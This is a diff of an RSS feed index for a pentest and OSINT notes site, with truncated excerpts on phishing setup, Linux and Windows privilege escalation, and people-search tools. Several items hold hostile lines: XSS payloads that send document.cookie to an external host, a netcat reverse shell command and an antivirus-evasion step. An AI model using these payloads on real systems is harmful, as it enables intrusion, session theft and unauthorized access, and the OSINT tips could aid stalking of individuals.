@@ -200,8 +200,8 @@ LLMNR / NBT-NS # You can Man in The Middle using LLMNR and NBT-NS if they&amp;#3
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/phishing-redteam-and-se/phishing_campaign_setup/</guid>
-      <description>General Informations # Using a specific and dedicated machine is a good choice. # It avoid being indexed and referenced as a phishing server for your own VPS # All the server configuration is pulled from the following Github repository # it provides a fully functionnal bash script to automate the process https://github.com/n0pe-sled/Postfix-Server-Setup 
-Domain Configuration # First step is to buy a domain name # Ex : totallylegit.eu # internetbs, gandhi, OVH.</description>
+      <description>General Informations # Using a specific and dedicated machine is a good choice. # It avoid being indexed and referenced as a phishing server for your own VPS # All the server configuration is pulled from the following Github repository # it provides a fully functionnal bash script to automate the process https://github.com/n0pe-sled/Postfix-Server-Setup # Generate typo &amp;amp; permutations on a domain name https://dnstwister.report/ 
+Debugging Tips / Important notes Blacklisted/Spam domain # If the domain is blacklisted / considered as spam, you can try to reference www.</description>
     </item>
     
     <item>
@@ -230,7 +230,7 @@ Theory # Used # c → cyphertext # m → Plaintext message converted as a number
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/linux-systems/recon_enumeration/</guid>
-      <description>Resources https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
+      <description>Resources https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ # Tmux shortcuts https://gist.github.com/MohamedAlaa/2961058 
 Basics hostname whoami id ifconfig uname -a uname -m # Check version using searchsploit -w distrib searchsploit -w kernel_version # Test trivials login combinaison # check /etc/passwd # then su login=password # Look for known machines arp -a # Get network configuration /sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf; cat /etc/sysconfig/network; cat /etc/networks; iptables -L; hostname; dnsdomainname # Find Linux distribution and version cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release; # Get environment variables cat /etc/profile; cat /etc/bashrc; cat ~/.</description>
     </item>
     
@@ -302,7 +302,7 @@ Monitoring, Recon and Dumping # Using the aircrack-ng suite # Turning on the mon
       <description>Resources https://html5sec.org/ https://gbhackers.com/top-500-important-xss-cheat-sheet/ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot 
 Tips # If XSS is not executed through the UI, you can try to insert it through the API # It can then fire on the UI. Many filters are not present like this 
 Basic Stored XSS # Setup simple server python -m SimpleHTTPServer 8080 # Test wget -O- http://$(wget -qO- icanhazip.com):8080/lol # Exploit &amp;lt;script&amp;gt;document.location(&amp;#39;http://IP_EXTERNE/&amp;#39;+document.cookie)&amp;lt;/script&amp;gt; 
-Payloads # Document.location &amp;lt;script&amp;gt;document.location(&amp;#39;http://IP_EXTERNE/&amp;#39;+document.cookie)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;document.location.href = &amp;#39;http://requestb.in/XXXXXX?cookies =&amp;#39; + document.</description>
+Payloads # Document.location &amp;lt;script&amp;gt;document.location(&#39;http://IP_EXTERNE/&#39;+document.cookie)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;document.location.href = &#39;http://requestb.in/XXXXXX?cookies =&#39; + document.</description>
     </item>
     
     <item>
@@ -680,6 +680,15 @@ GPG Encryption sudo gpg --decrypt /mnt/media/dir2/findme.</description>
     </item>
     
     <item>
+      <title>MISC &amp; Others</title>
+      <link>/web-attacks/client-side-injections/misc_others/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/client-side-injections/misc_others/</guid>
+      <description>Cross Origin Resource Sharing (CORS) https://portswigger.net/web-security/cors # CORS is a feature allowing access to resources hosted on different domains # If badly configured, it can allow cross-domain attacks like CSRF# Corsy is an automated tool to discover potential CORS misconfiguration and issues https://github.com/s0md3v/Corsy # Usage $ python3 corsy.py -u https://haax.fr ＣＯＲＳＹ {v0.2-beta} [+] Misconfiguration found! [!] Title: Wildcard value [!] Description: This host allows requests made from any origin. However, browsers will block all requests to this host by default.</description>
+    </item>
+    
+    <item>
       <title>Omnibus</title>
       <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/omnibus/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -791,8 +800,7 @@ General # Almost every Impacket scripts follows the same option syntax authentic
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/social-networks/instagram/</guid>
-      <description>Tips &amp;amp; Tricks # Webstagram allows you to browse any Instagram account https://web.stagram.com # Grampsy https://gramfly.com/ # Good online to search for accounts and browse them https://www.pictame.com/ # Instagram photo and video downloader https://downloadgram.com/ # SaveIG (public profiles) https://saveig.com # Full size Instagram photos https://www.instadp.com/ 
-InstagramOSINT (https://github.com/sc1341/InstagramOSINT) # The Instagram OSINT Tool gets a range of information from an Instagram account # that you normally wouldn&amp;#39;t be able to get from just looking at their profile # Username # Profile Name # URL # Followers # Following # Number of Posts # Bio # Profile Picture URL # Is Business Account?</description>
+      <description>Tips &amp;amp; Tricks # Instagram User ID can be very important to investigate # Each account has a unique user ID linked to the @username # Some websites allows to get it for an account https://codeofaninja.com/tools/find-instagram-user-id # You can then trace and spot re-used instagram account by # searching for old names and post, for example using # Google Dorks # Instagram Mirrors can be usefull to browse Instagram accounts # Search features are less restrictive # Some deleted content can still be indexed https://rankersta.</description>
     </item>
     
     <item>
@@ -842,7 +850,7 @@ WinSCP # WinSCP is potentially exploitable in the registry if not using a master
       
       <guid>/open-source-intelligence-osint/human-recon/searchingsomeone/</guid>
       <description>Resources # GREAT resources containing different graphs and processes # to investigate based on what you have https://medium.com/@Peter_UXer/osint-how-to-find-information-on-anyone-5029a3c7fd56 
-Searching People # Very good and accurtate tool # You can search by name, reverse phone or reverse address https://www.truepeoplesearch.com/https://i-sight.com/resources/101-osint-resources-for-investigators/ # You can use many online resources to search for people by name, phone number, etc.. Ancestry - Search for genealogy Filae - Search for genealogy, family, relationships... Infobel - Search worldwide people (white pages, yellow pages etc, you can find relations by name) MarketVisual - Map a company organization chart Numberway - Way to find others resources to get phone numbers Pipl - Search engines only for people Spokeo - Search for people information (only in USA) Usersearch - Search engine tool to find someone using pseudo/username Webmii - Search engine that compiles information on one person # Search by photo Tineye # Search on communities and blogs (reddit.</description>
+Searching People # Very good and accurtate tool # You can search by name, reverse phone or reverse address https://www.truepeoplesearch.com/# 118218 for France is very good # Reverse dict https://www.118712.fr/https://i-sight.com/resources/101-osint-resources-for-investigators/ # You can use many online resources to search for people by name, phone number, etc.. RocketReach - Search for many informations about peoples (free plan, 3/month) Ancestry - Search for genealogy Filae - Search for genealogy, family, relationships.</description>
     </item>
     
     <item>
@@ -871,7 +879,7 @@ MySQL # If MySQL is running as root, you can run commands sys_exec(&amp;#39;user
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/tricks/</guid>
-      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html https://lolbas-project.github.io/# python3 gtfo -e Certutil.exe # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/m***REMOVED***/Documents/Galactic/systeminfo.txt # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.</description>
+      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html https://lolbas-project.github.io/# python3 gtfo -e Certutil.exe # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/xxx/Documents/Galactic/systeminfo.txt # Metasploit also has a module &amp;gt; use post/multi/recon/local_exploit_suggester msf5 post(multi/recon/local_exploit_suggester) &amp;gt; options Module options (post/multi/recon/local_exploit_suggester): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on SHOWDESCRIPTION false yes Displays a detailed description for the available exploits msf5 post(multi/recon/local_exploit_suggester) &amp;gt; set SESSION 1 SESSION =&amp;gt; 1 msf5 post(multi/recon/local_exploit_suggester) &amp;gt; run [*] 10.</description>
     </item>
     
     <item>
@@ -1119,12 +1127,12 @@ cmd.exe # Enable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\Cur
     </item>
     
     <item>
-      <title>Usernames and Emails</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/usernames_mails/</link>
+      <title>Snapchat</title>
+      <link>/open-source-intelligence-osint/human-recon/social-networks/snapchat/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/usernames_mails/</guid>
-      <description>Socialscan (https://github.com/iojw/socialscan) # Many tools used to check if an account exists comes with false positive # 100% accuracy: Rather than scanning profile pages, socialscan queries the # registration servers of the platforms directly, retrieving the appropriate # CSRF tokens, headers, and cookies. # This eliminates all false positives/negatives, ensuring that results are accurate. # Speed: socialscan uses asyncio along with aiohttp to conduct all # queries concurrently, resulting in very quick searching even with bulk queries.</description>
+      <guid>/open-source-intelligence-osint/human-recon/social-networks/snapchat/</guid>
+      <description>Online Research Tools # Online browser # Potentially NSFW https://sovip.</description>
     </item>
     
     <item>
@@ -1158,23 +1166,13 @@ Build a FTP and transfer file # Set up a ftp downloading script on the target ma
     </item>
     
     <item>
-      <title>General - MISC - Multi</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/general_misc/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/general_misc/</guid>
-      <description>Tips &amp;amp; Tricks # Liveleak allows to see what will be removed on others video website.. # Take care https://www.liveleak.com/ # Webcams (legit and bad configuration) http://www.insecam.org/ https://www.earthcam.com # Download Periscope videos https://downloadperiscopevideos.com/index.php # Professionnal profiles (like photos) can be used to search for differents # personal profiles which are easier to exploit and dig 
-Deblurring images # Gaussian Blur # Install GIMP Plugin &amp;#34;G&amp;#39;MIC&amp;#34; # Filters&amp;gt;G’MIC&amp;gt;Details&amp;gt;Sharpen (Deblur)# Pixelize # The Pixelize blur works by dividing an image into a number of squares # and then replacing all the pixels in each square by average of their values.</description>
-    </item>
-    
-    <item>
       <title>MISC &amp; Others</title>
       <link>/web-attacks/misc_others/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/misc_others/</guid>
       <description>Table of Content  MISC IDOR Hidden Parameters Apache Server Status Command Injection Server Side Template Injection (SSTI) Image Tragick Shellshock Heartbleed  
-MISC # Security Headers https://securityheaders.com # Install files # You can check for backup files using the following extensions .backup, .bck, .old, .save, .bak, .sav, ~, .copy, .old, .orig, .tmp, .txt, .back, .bkp, .bac, .tar, .gz, .tar.gz, .zip, .rar # Check headers # They often give informations curl -v &amp;lt;target&amp;gt; # Test for others HTTP methods (verb tampering) # Bypass .</description>
+MISC # Security Headers https://securityheaders.com # /!\ HTTP POST Requests needs two carriage return at the end to be valid ! # Install files # You can check for backup files using the following extensions .backup, .bck, .old, .save, .bak, .sav, ~, .copy, .old, .orig, .</description>
     </item>
     
     <item>
@@ -1197,6 +1195,15 @@ Modules &amp;amp; Tools • Censys: uses censys.io to collect a large amount of 
     </item>
     
     <item>
+      <title>Usernames and Emails</title>
+      <link>/open-source-intelligence-osint/human-recon/social-networks/usernames_mails/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/social-networks/usernames_mails/</guid>
+      <description>Socialscan (https://github.com/iojw/socialscan) # Many tools used to check if an account exists comes with false positive # 100% accuracy: Rather than scanning profile pages, socialscan queries the # registration servers of the platforms directly, retrieving the appropriate # CSRF tokens, headers, and cookies. # This eliminates all false positives/negatives, ensuring that results are accurate. # Speed: socialscan uses asyncio along with aiohttp to conduct all # queries concurrently, resulting in very quick searching even with bulk queries.</description>
+    </item>
+    
+    <item>
       <title>135 - RPC</title>
       <link>/recon-enumeration/services-enumeration/135_rpc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -1212,8 +1219,19 @@ Modules &amp;amp; Tools • Censys: uses censys.io to collect a large amount of 
       
       <guid>/web-attacks/burpsuite/</guid>
       <description>WORK IN PROGRESS 
+Notes / Tips # /!\ HTTP POST Requests needs two carriage return at the end to be valid ! 
 Modules / Addons TODO 
-Resources to check # Complete MOOC style course (subscribing but it&amp;#39;s free) (2 links are the same course) https://www.udemy.com/burp-suite/ https://hackademy.aetherlab.net/p/burp-suite # Video course https://www.tutorialspoint.com/burpsuite/index.asp # Kinda detailed tutorial (text + pictures) https://www.pentestgeek.com/web-applications/burp-suite-tutorial-1 https://www.pentestgeek.com/web-applications/how-to-use-burp-suite # Fast course/tutorial (text + images) https://linuxconfig.org/learn-burp-suite-on-kali-linux-part-2 https://linuxconfig.org/learn-burp-suite-on-kali-linux-part-3 https://linuxconfig.org/learn-burp-suite-on-kali-linux-part-4 # ??? https://portswigger.net/web-security # Conferences slides https://fr.slideshare.net/ZackMeyers/web-hacking-with-burp-suite-101 # Not free (but it seems to have a kind of 10 days free ?</description>
+Resources to check # Complete MOOC style course (subscribing but it&amp;#39;s free) (2 links are the same course) https://www.udemy.com/burp-suite/ https://hackademy.aetherlab.net/p/burp-suite # Video course https://www.tutorialspoint.com/burpsuite/index.asp # Kinda detailed tutorial (text + pictures) https://www.pentestgeek.com/web-applications/burp-suite-tutorial-1 https://www.pentestgeek.com/web-applications/how-to-use-burp-suite # Fast course/tutorial (text + images) https://linuxconfig.org/learn-burp-suite-on-kali-linux-part-2 https://linuxconfig.</description>
+    </item>
+    
+    <item>
+      <title>General - MISC - Multi</title>
+      <link>/open-source-intelligence-osint/human-recon/social-networks/general_misc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/social-networks/general_misc/</guid>
+      <description>Tips &amp;amp; Tricks # Liveleak allows to see what will be removed on others video website.. # Take care https://www.liveleak.com/ # Webcams (legit and bad configuration) http://www.insecam.org/ https://www.earthcam.com # Download Periscope videos https://downloadperiscopevideos.com/index.php # Professionnal profiles (like photos) can be used to search for differents # personal profiles which are easier to exploit and dig 
+Deblurring images # Gaussian Blur # Install GIMP Plugin &amp;#34;G&amp;#39;MIC&amp;#34; # Filters&amp;gt;G’MIC&amp;gt;Details&amp;gt;Sharpen (Deblur)# Pixelize # The Pixelize blur works by dividing an image into a number of squares # and then replacing all the pixels in each square by average of their values.</description>
     </item>
     
     <item>
